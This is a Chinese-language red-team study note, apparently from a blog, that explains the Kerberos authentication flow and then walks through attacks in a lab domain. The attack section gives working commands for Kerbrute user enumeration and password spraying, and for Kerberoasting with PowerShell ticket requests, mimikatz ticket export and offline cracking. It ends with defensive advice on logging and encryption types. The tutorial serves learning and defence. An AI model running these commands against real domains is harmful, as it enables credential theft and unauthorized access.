---
title: Kerberos 协议详解与利用
date: 2021-09-23 15:14:18
id: 210923-151418
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231513202.png
tags:
- 红队
- 学习笔记
- 内网
categories:
- 内网学习笔记
---

# 一、Kerberos 协议

Kerberos 原意是希腊神话中看守冥界入口的恶犬刻耳柏洛斯，类似于「哈利波特·神秘魔法石」中守护魔法石的三头犬毛毛。

这里所讲的 Kerberos 是一种网络身份认证协议，个人猜测作者采用这个名字也正是为了体现出该协议里身份认证的特性，即通过 Kerberos 协议守护网络通信中的安全，下面就来详细看看 Kerberos 协议。

Kerberos 是一种由 MIT 提出用来在非安全网络中对个人通信进行身份认证的计算机网络授权协议，该协议使用 AES 对称加密算法为客户端和服务端之间提供强身份认证，在域环境下的身份认证利用的就是 Kerberos 协议。

在计算机通讯中，当客户端去访问服务端时，作为服务端需要判断对方是否有权限访问自己主机上的服务，作为安全人员我们想保证整个过程即使被拦截或者篡改也不会影响数据的安全性，Kerberos 协议正是为了解决这些问题而产生的。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906154732.png)

上图是 Kerberos 的认证流程，协议中的名词缩写解释如下：

- AS (Authentication Service): 认证服务器
- TGS (Ticket Granting Service): 票据授予服务器
- KDC (Key Distribution Center): 密钥分发中心
- TGT (Ticket Granting Ticket): 票据授权票据，或者说：票据的票据
- ST (Servre Ticket): 服务票据

根据上图，总共分为 6 步，这里一步一步进行解释

## 第一阶段：客户端 Clinet 与认证服务器 AS 通信

首先用户在客户端输入自己的用户名和密码，此时客户端会将用户输入的密码转换为哈希值，这个哈希值就是客户端用户的**用户密钥**。

① 第一步，客户端向认证服务器发起请求，请求内容为自己的用户名、客户端地址和当前时间戳。

> 此时客户端不会向认证服务器发送用户密钥，认证服务器会利用自己的本地数据库里对应客户端用户的密码生成用户密钥。

② 第二步，认证服务器接收到客户端的请求，此时认证服务器会根据客户端传来的用户名在本地数据库中查找这个用户名。

> 此时认证服务器只会查找具有相同用户名的用户，并不会判断客户端身份的可靠性。

如果没有这个用户名，认证失败；如果存在该用户名，则认证服务器会认为用户存在，此时认证服务器会向客户端发送两条信息，分别如下：

- 第一条信息：**客户端与票据授予服务器的会话密钥。**该会话密钥通过用户密钥进行加密，这个用户密钥就是认证服务器利用自己的本地数据库里对应客户端用户的密码生成的，该条消息中除了会话密钥还有票据授予服务器的地址和时间戳。
- 第二条信息：**票据授权票据。**票据授权票据通过票据授予服务器的密钥进行加密，票据授权票据里包括了第一条消息里的会话密钥、用户名、客户端地址、票据授权票据的有效时间以及时间戳。

在客户端收到认证服务器的响应后，会尝试使用自己的用户密钥解密第一条消息，如果解密成功则会获得客户端与票据授予服务器的会话密钥以及时间戳等信息。接着客户端会判断时间戳是否在 5 分钟以内，如果大于 5 分钟则认为认证服务器是伪造的，小于 5 分钟则继续下一步认证。

至此，第一阶段通信完成。

## 第二阶段：客户端 Clinet 与票据授予服务器 TGS 通信


③ 第三步，客户端向票据授予服务器发起请求，请求里包含了两条信息：

- 第一条信息：上一步认证服务器返回的第二条信息即票据授予票据，以及自己想要访问的服务 ID
- 第二条消息：使用客户端与票据授予服务器的会话密钥加密的用户名、时间戳。

④ 第四步，票据授予服务器接收到请求，首先票据授予服务器会判断密钥分发中心的数据库中是否存在客户端想要访问的服务，如果不存在，认证失败，如果存在则继续接下来的认证。

接下来票据授予服务器会解密票据授予票据的内容，此时票据授予服务器获取到用户名、客户端与票据授予服务器的会话密钥、时间戳信息。

之后票据授予服务器使用客户端与票据授予服务器的会话密钥解密客户端发来的第二条信息，取出其中的用户名和票据授予票据里的用户信息进行对比，这里也会去判断取出的时间戳是否正常，如果全部没问题则认为客户端身份正常，继续下一步。

此时票据授予服务器向客户端发起响应，响应信息包含两条信息：

- 第一条信息：**使用服务端的密钥加密的服务票据**，其中包括用户名、客户端 IP、客户端要访问的服务端信息、服务票据的有效时间、时间戳以及客户端与服务端的会话密钥。
- 第二条信息：**使用客户端和票据授予服务器的会话密钥加密的内容**，其中包括客户端和服务端的会话密钥、时间戳和服务票据的有效时间。

在客户端收到票据授予服务器的响应后，会使用客户端和票据授予服务器的会话密钥解密收到的第二条信息，得到客户端和服务端的会话密钥，用于接下来的通信。这里同样的也会检查时间戳是否有误，值的注意的是这里客户端是无法解密返回的第一条信息的，因为第一条信息是利用服务端的密钥加密的。


至此，第二阶段通信完成。

## 第三阶段：客户端 Clinet 与 服务端 Server 通信


⑤ 第五步，客户端向服务端发送请求，请求内容包括两条信息：

- 第一部分：上一步里票据授予服务器返回的使用服务端的密钥加密的服务票据。
- 第二部分：使用客户端和服务端的密钥加密的用户名和时间戳信息。

⑥ 第六步，服务端解密出收到信息的第一部分内容，核对时间戳之后，取出客户端和服务端的会话密钥，利用客户端和服务端的会话密钥解密第二部分内容，获得用户名信息。

此时服务端会将第一部分解密后的信息与第二部分解密后的信息进行对比，如果一致则说明该客户端身份为真实身份，此时服务端向客户端响应使用客户端和服务端的会话密钥加密的表示验证通过的信息以及时间戳，客户端接受到响应后，验证时间戳正确后，便会认为这个服务端是可信任的了。


至此，第三阶段通信完成，到这里整个 Kerberos 认证也就完成了，接下来客户端与服务端就能放心的进行通信了。

# 二、Kerberos 协议的利用

## 1、用户名枚举

当用户名输入正确或错误时，Kerberos 协议所返回的状态码是不同的，利用这一特性可以进行用户名枚举，这里使用 Kerbrute 工具进行演示。

```yaml
kerbrute userenum --dc 192.168.7.7 -d teamssix.com users.txt
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231512850.png)

## 2、密码喷洒

密码喷洒和用户名枚举原理一样，而且使用 Kerberos 协议对 Windows 密码进行暴力破解比其他方法要快得多，并且更加隐蔽，因为 Kerberos 身份验证即使失败也不会触发 4625 登录失败事件。

这里同样使用 Kerbrute 工具进行演示。

```yaml
kerbrute passwordspray --dc 192.168.7.7 -d teamssix.com users.txt 1qaz@WSX
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231512431.png)

## 3、Kerberoast

> 关于 Kerberoast 和 SPN 的详细介绍可以参考我之前的文章：[https://teamssix.com/210907-121204.html](https://teamssix.com/210907-121204.html)

Kerberoast 是一种针对 Kerberos 协议的利用方式，在需要使用某个服务向票据授予服务器发送请求时（即上述 Kerberos 协议里第 ③ 步），用户首先需要有个有效的票据授予票据。

当票据授予票据被验证有效且具有该服务的权限时，票据授予服务器会向用户返回使用服务端密钥加密的服务票据，该服务票据使用与该服务相关联计算机账号的密码加密，因此 RT 可以对加密后的内容进行离线哈希破解。

**Kerberoast 的利用思路：**
i. 查询 SPN
ii. 请求并导出服务票据
iii. 对服务票据进行爆破

> 这里使用 Kerberoast 工具包作为演示，以下工具均在 Kerberoast 工具包里。

### i. 查询 SPN

```javascript
./GetUserSPNs.ps1
```

可以看到 test 用户有个 MSSQLSvc/DBSRV.teamssix.com:1433 服务

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231512937.png)


### ii. 请求并导出服务票据

这里请求 MSSQLSvc/DBSRV.teamssix.com:1433 服务并导出服务票据

```javascript
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DBSRV.teamssix.com:1433"  
```

可以使用 klist 查看新的是否有票据缓存，有的话就可以使用 mimikatz 导出票据了

```javascript
kerberos::list /export
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231513202.png)

### iii. 对服务票据进行爆破

使用 Kerberoast 工具包里的 tgsrepcrack.py 就可以破解

```javascript
python tgsrepcrack.py password.txt mssql.kirbi
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231513659.png)

# 三、防范思路

1、密码设置为复杂密码

2、在进行日志审计时，可以重点关注 ID 为 4769（请求 Kerberos 服务票据）的日志，如果有较多的 4769 日志，应进一步检查系统中是否存在恶意行为。

3、 Kerberos 协议的默认加密方式是 AES256_HMAC，而服务票据只有在加密方式是 RC4_HMAC_MD5 时才能破解，因此可以对当前系统的加密方式进行检查，看看是否为 AES256_HMAC 的加密方式。


> 参考文章：
>
> [https://zh.wikipedia.org/wiki/Kerberos](https://zh.wikipedia.org/wiki/Kerberos)
>
> [https://teamssix.com/210907-121204.html](https://teamssix.com/210907-121204.html)
>
> [https://www.jianshu.com/p/23a4e8978a30](https://www.jianshu.com/p/23a4e8978a30)
>
> [https://zh.wikipedia.org/wiki/%E5%88%BB%E8%80%B3%E6%9F%8F%E6%B4%9B%E6%96%AF](https://zh.wikipedia.org/wiki/%E5%88%BB%E8%80%B3%E6%9F%8F%E6%B4%9B%E6%96%AF)
>
> [https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3Kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/](https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/)
>
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)
